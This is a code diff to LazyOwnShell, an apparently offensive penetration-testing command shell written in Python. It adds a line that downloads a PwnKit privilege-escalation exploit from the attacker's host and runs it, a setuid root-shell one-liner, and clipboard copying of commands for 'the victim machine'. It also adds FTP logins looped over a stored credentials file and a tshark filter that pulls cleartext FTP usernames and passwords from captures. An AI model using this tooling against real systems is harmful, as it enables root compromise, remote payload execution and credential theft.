@@ -2135,7 +2135,7 @@ class LazyOwnShell(Cmd):
         Manual execution:
         1. Run the `getcap -r /` command to list file capabilities recursively from the root directory.
         2. Redirect standard error to `/dev/null` to suppress error messages.
-
+        3. Copy to clipboard the command to appy in the victim machine. 
         Dependencies:
         - `getcap` must be installed on the system.
 
@@ -2145,9 +2145,11 @@ class LazyOwnShell(Cmd):
         Note:
             - The command may require elevated permissions to access certain directories and files.
         """
-
+        command = "getcap -r / 2>/dev/null"
         print_msg(f"Try get capabilities {RESET}")
-        os.system("getcap -r / 2>/dev/null")
+        print_msg(command)
+        os.system(command)
+        copy2clip(command)
         return
 
     def do_getseclist(self, line):
@@ -4517,6 +4519,9 @@ class LazyOwnShell(Cmd):
 
         Note: Ensure `xclip` is installed and properly configured to use clipboard functionalities.
         """
+        lhost = self.params["lhost"]
+        if not check_lhost(lhost):
+            return
 
         commands_list = [
             ("List dir", "ls -lha"),
@@ -4541,7 +4546,8 @@ class LazyOwnShell(Cmd):
             ("find .bash_history files in current dir", "find . -type f -name .bash_history"),
             ("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
             ("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
-            ("Locate", ""),
+            ("python", "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"),
+            ("pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit ; chmod +x ./PwnKit ; ./PwnKit"),
             ("locate httpd.conf files", "locate httpd.conf"),
             ("locate vhosts.conf files", "locate vhosts.conf"),
             ("locate proftpd.conf files", "locate proftpd.conf"),
@@ -4998,6 +5004,55 @@ class LazyOwnShell(Cmd):
             for line in file:
                 user, passwd = line.strip().split(":")
                 command = f"sshpass -p {passwd} ssh -o StrictHostKeyChecking=no -p {rport} {user}@{rhost}"
+                print_msg(command)
+                os.system(command)
+        return
+
+    def do_ftp(self, line):
+        """
+        Connects to an ftp host using credentials from a file and a specified port.
+
+        This function performs the following actions:
+        1. Retrieves the remote host (`rhost`) from the parameters.
+        2. Checks if the `rhost` is valid using the `check_rhost` function.
+        3. Sets the ftp port to the value provided in the `line` parameter.
+        4. Checks if the `credentials.txt` file exists in the `./sessions` directory.
+        5. Reads credentials (username and password) from the `credentials.txt` file, where each line is formatted as `user:password`.
+        6. Constructs and executes an ftp command using `sshpass` to handle password authentication and `ftp` to initiate the connection.
+        7. Displays the ftp command being executed.
+
+        Usage:
+            ftp <port>
+
+        :param line: The port number to use for the ftp connection.
+        :type line: str
+        :returns: None
+
+        Manual execution:
+        To manually use this function:
+        1. Ensure `sessions/credentials.txt` exists and contains valid ftp credentials in the format `user:password`.
+        2. Run the function with the port number as an argument.
+        3. The function will attempt to connect to the ftp host using each set of credentials and the specified port.
+
+        Note: Ensure `sshpass` is installed on your system for password-based SSH authentication. If `sshpass` is not available, you may need to install it or use an alternative method for SSH authentication.
+        """
+
+        rhost = self.params["rhost"]
+        if not check_rhost(rhost):
+            return
+
+        rport = line  # El puerto será proporcionado como argumento 'line'
+        credentials_file = "./sessions/credentials.txt"
+        if not os.path.exists:
+            print_error(
+                "sessions/creadentials.txt must exist ex: createcredentials user:password "
+            )
+            return
+
+        with open(credentials_file, "r") as file:
+            for line in file:
+                user, passwd = line.strip().split(":")
+                command = f"sshpass -p {passwd} ftp {user}@{rhost}"
                 print_msg(command)
                 os.system(command)
         return
@@ -6487,16 +6542,41 @@ class LazyOwnShell(Cmd):
         Note: Ensure that the capture file `pcaps/capture_<rhost>.pcap` is available in the `pcaps` directory.
         """
 
-        
-        rhost = self.params['rhost']
-        if not check_rhost(rhost):
-            return
-        path = os.getcwd()
-        if not os.path.exists(f"{path}/pcaps/capture_{rhost}.pcap"):
-            print_error("you must run command do_tcpdump_capture tun0 first.")
-            return
-        print_msg(f"{WHITE}sudo tshark -r pcaps/capture_{rhost}.pcap  -T fields -e ip.dst -e frame.time {RESET} ")
-        os.system(f"sudo tshark -r pcaps/capture_{rhost}.pcap  -T fields -e ip.dst -e frame.time ")
+        pcaps_dir = 'pcaps'
+        all_items = os.listdir(pcaps_dir)
+
+        for item in all_items:
+            item_path = os.path.join(pcaps_dir, item)
+
+            try:
+                if os.path.isfile(item_path):
+                    print_msg("Analizing...")
+            
+                    rhost = self.params['rhost']
+                    if not check_rhost(rhost):
+                        return
+
+                    pcap_file = item_path
+                    if not os.path.exists(pcap_file):
+                        print_error("you must run command do_tcpdump_capture tun0 first.")
+                        return
+                    if os.path.splitext(pcap_file)[1].lower() == '.pcap':
+
+                        command = f'tshark -r {pcap_file} -T fields -e frame.number -e frame.time -e frame.len -e ip.src -e ip.dst -e ip.proto -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport -e http.request.uri -e http.response.code -e ftp.request.command -e ftp.request.arg -e dns.qry.name '
+                        print_msg(command)
+                        os.system(command)
+                        command = f'tshark -r {pcap_file} -q -z conv,tcp,ip '
+                        print_msg(command)
+                        os.system(command)
+                        command = f"tshark -r {pcap_file} -Y 'ftp.request.command == USER || ftp.request.command == PASS' -T fields -e ip.dst -e frame.time -e ftp.request.command -e ftp.request.arg"
+                        print_msg(command)
+                        os.system(command)
+                    else:
+                        print_error("No pcap files found in pcaps directory")
+
+            except Exception as e:
+                print_error(f"Failed to delete {item_path}: {e}")
+
         return
 
     def do_rdp(self, line):
